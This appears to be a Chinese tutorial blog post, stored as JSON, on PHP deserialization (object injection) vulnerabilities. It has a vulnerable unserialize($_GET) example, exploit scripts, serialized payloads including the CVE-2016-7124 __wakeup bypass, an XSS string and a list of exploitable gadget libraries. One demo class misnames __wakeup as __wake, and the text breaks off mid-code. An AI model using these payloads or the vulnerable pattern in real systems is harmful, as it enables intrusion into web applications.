{"title":"PHP反序列化","uid":"5bbc7d316ccd2a535cfb30c74b9fa118","slug":"PHP反序列化","date":"2020-10-02T03:25:15.000Z","updated":"2020-10-06T12:16:56.000Z","comments":true,"path":"api/articles/PHP反序列化.json","keywords":"A1andNS","cover":[],"content":"<h2 id=\"序列化与反序列化\"><a href=\"#序列化与反序列化\" class=\"headerlink\" title=\"序列化与反序列化\"></a>序列化与反序列化</h2><p>序列化（serialization）在计算机科学的数据处理中，是指将数据结构或对象状态转换成可取用格式（例如存成文件，存于缓冲，或经由网络中发送），以留待后续在相同或另一台计算机环境中，能恢复原先状态的过程。这个过程就像把数据封装成某种可逆的特殊结构，然后在另一台计算机或相同环境下恢复回数据，所谓的反序列化就是恢复的这个逆向过程。</p>\n<p>序列化的目的就是方便在计算机中或计算机间传输数据和存储。serialize()将一个对象转换为一个字符串，unserialize()则是将一个字符串还原回一个对象，在PHP应用中，序列化和反序列化一般用做缓存，常见于session缓存，cookie之类。</p>\n<h2 id=\"PHP反序列化中常见的PHP魔术方法\"><a href=\"#PHP反序列化中常见的PHP魔术方法\" class=\"headerlink\" title=\"PHP反序列化中常见的PHP魔术方法\"></a>PHP反序列化中常见的PHP魔术方法</h2><h3 id=\"void-wakeup-void\"><a href=\"#void-wakeup-void\" class=\"headerlink\" title=\"void __wakeup(void)\"></a>void __wakeup(void)</h3><p>这个魔术方法在反序列化恢复对象之前会被调用，这是因为unserialize()函数会检查是否存在一个__wakeup()方法，如果存在就调用这个方法，预先准备对象需要的资源。</p>\n<h3 id=\"void-construct-mixed-args-…\"><a href=\"#void-construct-mixed-args-…\" class=\"headerlink\" title=\"void __construct([ mixed $args [,$…]])\"></a>void __construct([ mixed $args [,$…]])</h3><p>这个魔术方法是构造函数，具有构造函数的类会在每次创建新对象时调用此方法，一般用于对变量赋初值。</p>\n<h3 id=\"void-destruct-void\"><a href=\"#void-destruct-void\" class=\"headerlink\" title=\"void __destruct(void)\"></a>void __destruct(void)</h3><p>这个魔术方法是析构函数，他会在某个对象的所有引用被删除或者对象被显式销毁时执行。</p>\n<h3 id=\"public-string-toString-void\"><a href=\"#public-string-toString-void\" class=\"headerlink\" title=\"public string __toString(void)\"></a>public string __toString(void)</h3><p>这个魔术方法用于把一个类当成字符串时应该怎么回应。例如使用echo $obj;应该显示写什么东西。这个方法就是在这个时候起作用的，会返回一下字符串，否则将会出现致命错误。</p>\n<h3 id=\"sleep\"><a href=\"#sleep\" class=\"headerlink\" title=\"__sleep()\"></a>__sleep()</h3><p>这个魔术方法是在序列化一个对象之前就调用此方法，如果这个方法存在，在序列化对象之前会调用这个方法，目的是清理对象，并且返回一个包含对象中所有变量名称的数组。如果改方法不返回任何内容，则NULL被序列化。</p>\n<h3 id=\"call\"><a href=\"#call\" class=\"headerlink\" title=\"__call()\"></a>__call()</h3><p>这个魔术方法在调用对象中不存在的方法时会自动调用。例如一个类A中不存在一个方法run()或run()的访问权限不授权。那么在$obj=new A()后去执行obj-&gt;run()就会自动调用__call()方法出来救场了。</p>\n<h3 id=\"get\"><a href=\"#get\" class=\"headerlink\" title=\"__get()\"></a>__get()</h3><p>在调用私有属性的时候会自动执行该魔术方法</p>\n<h3 id=\"isset\"><a href=\"#isset\" class=\"headerlink\" title=\"__isset()\"></a>__isset()</h3><p>在不可访问的属性上调用isset()或者empty()就会触发该魔术方法</p>\n<h3 id=\"unset\"><a href=\"#unset\" class=\"headerlink\" title=\"__unset()\"></a>__unset()</h3><p>在不可访问的属性上使用unset()时就会触发该魔术方法。</p>\n<h3 id=\"invoke\"><a href=\"#invoke\" class=\"headerlink\" title=\"__invoke()\"></a>__invoke()</h3><p>但尝试以调用函数的方式调用一个对象时，就会调用invoke方法。</p>\n<h2 id=\"PHP反序列化漏洞成因\"><a href=\"#PHP反序列化漏洞成因\" class=\"headerlink\" title=\"PHP反序列化漏洞成因\"></a>PHP反序列化漏洞成因</h2><p>PHP反序裂化漏洞也被称为PHP对象注入，是因为程序对输入数据的处理不当导致的，很多时候漏洞都和对用户输入的过度信任导致。</p>\n<p>一个简单例子</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">A</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$target</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"demo\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// TODO: Implement __destruct() method.</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"this is the destructing&lt;br/>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">target</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br/>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"destructed&lt;br/>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'target'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a_unser</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>析构函数在对象被销毁时会输出target的值，所以我们可以通过构造一个对象来，控制$target的数值，从而控制数据流。</p>\n<p>构造这个反序列化利用脚本：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">A</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$target</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"I am A1andNS!\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">A</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>生成这个序列化的结果：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">O:1:&quot;A&quot;:1:&#123;s:6:&quot;target&quot;;s:13:&quot;I am A1andNS!&quot;;&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这样就控制了target的输出内容了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201004111845.png\" alt=\"结果\"></p>\n<p>同理如果target设置为了<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，就可以实现XSS了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201004112056.png\" alt=\"xss\"></p>\n<h2 id=\"PHP反序列化和POP链\"><a href=\"#PHP反序列化和POP链\" class=\"headerlink\" title=\"PHP反序列化和POP链\"></a>PHP反序列化和POP链</h2><h3 id=\"Autoloading\"><a href=\"#Autoloading\" class=\"headerlink\" title=\"Autoloading\"></a>Autoloading</h3><p>传统的PHP要求应用导入每一个类中的所有类文件，这就意味着需要include大量的文件，这显然不是什么聪明的方法。所以当前的PHP主流框架都使用Autoloading自动加载类来完成这样的工作，提高了效率，简化了类之间调用的功能，但是也为序列化造成了便利。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>autoloading的实现主要是依靠<code>__autoload()</code>魔术方法来实现，不过<code>__autoload()</code>魔术方法在PHP7.2之后被弃用，取而代之的是spl_autoload_register()函数，他的好处是可以自定义多个autolaoder</p></blockquote>\n<h3 id=\"Composer与Autoloading\"><a href=\"#Composer与Autoloading\" class=\"headerlink\" title=\"Composer与Autoloading\"></a>Composer与Autoloading</h3><p>Composer 是 PHP 的一个依赖管理工具。我们可以在项目中声明所依赖的外部工具库，Composer 会帮你安装这些依赖的库文件，有了它，我们就可以很轻松的使用一个命令将其他人的优秀代码引用到我们的项目中来。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>composer默认是从Packagist来下载依赖库的。所以可以从几个方向入手</p>\n<p>1、从可能存在漏洞的依赖库文件入手</p>\n<p>2、从应用的代码框架的逻辑上入手</p>\n<p>3、从PHP语言本身的漏洞入手</p></blockquote>\n<h4 id=\"寻找依赖库漏洞\"><a href=\"#寻找依赖库漏洞\" class=\"headerlink\" title=\"寻找依赖库漏洞\"></a>寻找依赖库漏洞</h4><p>寻找依赖库漏洞的粗暴方法：在依赖库中使用RIPS或grep全局搜索<code>__wakeup()</code>和<code>__destruct()</code>，存在POP组件的最好方式，就是直接查看composer.json文件，其中会写应用需要使用哪些库。</p>\n<p>一些可以利用的组件的依赖库：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">任意写\nmonolog&#x2F;monolog(&lt;1.11.0)\nguzzlehttp&#x2F;guzzle\nguzzle&#x2F;guzzle\n任意删除\nswifmailer&#x2F;swiftmailer<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>除了从依赖库入手，还有就是PHP语言本身的漏洞，比如但序列化字符串中表示对象个数的值大于实际属性个数的时候就会跳过<code>__wakeup()</code>函数的执行。</p>\n<h4 id=\"下面就以-wakeup-绕过来上个实例\"><a href=\"#下面就以-wakeup-绕过来上个实例\" class=\"headerlink\" title=\"下面就以__wakeup()绕过来上个实例\"></a>下面就以__wakeup()绕过来上个实例</h4><p>class.php文件如下：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">A</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">var</span> <span class=\"token variable\">$target</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"demo\"</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">__wake</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">target</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"wakeup!\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// TODO: Implement __destruct() method.</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"this is the destructing&lt;br/>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">target</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br/>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"destructed&lt;br/>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'target'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a_unser</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>exp：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">A</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$target</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"A1andNS!\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">A</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>如果使用</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">O:1:&quot;A&quot;:1:&#123;s:6:&quot;target&quot;;s:8:&quot;A1andNS!&quot;;&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://s1.ax1x.com/2020/10/04/08oeeg.png\" alt=\"08oeeg.png\"></p>\n<p>反序列的时候由于调用了<code>__wakeup()</code>魔术方法，而让target被重置。</p>\n<p>payload:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">O:1:&quot;A&quot;:2:&#123;s:6:&quot;target&quot;;s:8:&quot;A1andNS!&quot;;&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://s1.ax1x.com/2020/10/04/08onoj.png\" alt=\"08onoj.png\"></p>\n<p>这个就通过使用那个改大属性个数来绕过<code>__wakeup()</code>方法，但是需要注意的是这个漏洞在最新版的PHP中已经不存在了</p>\n<p>漏洞CVE: <code>CVE-2016-7124</code></p>\n<p>受影响版本：</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><ul>\n<li>PHP before 5.6.25</li>\n<li>PHP 7.x before 7.0.10</li>\n</ul></blockquote>\n<h4 id=\"toString-方法利用\"><a href=\"#toString-方法利用\" class=\"headerlink\" title=\"__toString()方法利用\"></a>__toString()方法利用</h4><p>但反序列化后对象被输出在模板中的时候会被转换为字符串，这样就会触发相关漏洞，找漏洞的处理流程：</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>__toString触发条件：</p>\n<p>echo ($obj) / print ($obj) 打印会触发</p>\n<p>字符串拼接时会触发</p>\n<p>格式化字符串时会触发</p>\n<p>与字符串进行==比较的时候触发（PHP在进行==比较的时候会转换参数类型）</p>\n<p>格式化SQL语句，绑定参数时</p>\n<p>数组中有字符串时</p></blockquote>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">toString_demo</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$test1</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'test1'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$test</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">test1</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$test</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// TODO: Implement __destruct() method.</span>\n        <span class=\"token keyword\">print</span> <span class=\"token string double-quoted-string\">\"__destruct:\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">print</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">test1</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">print</span> <span class=\"token string double-quoted-string\">\"&lt;br/>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// TODO: Implement __wakeup() method.</span>\n        <span class=\"token keyword\">print</span> <span class=\"token string double-quoted-string\">\"__wakeup:\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">test1</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"wakeup\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">print</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">test1</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br/>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// TODO: Implement __toString() method.</span>\n        <span class=\"token keyword\">print</span> <span class=\"token string double-quoted-string\">\"__toString:\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">test1</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"tosTRING\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">test1</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br/>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">toString_demo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"demo\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">//这里会调用__construct()方法</span>\n<span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">//这里会调用__wakeup()方法</span>\n<span class=\"token keyword\">print</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">//这里会调用__toString()方法</span>\n<span class=\"token comment\">//结束时调用__destruct()方法</span></span><span aria-hidden=\"true\" 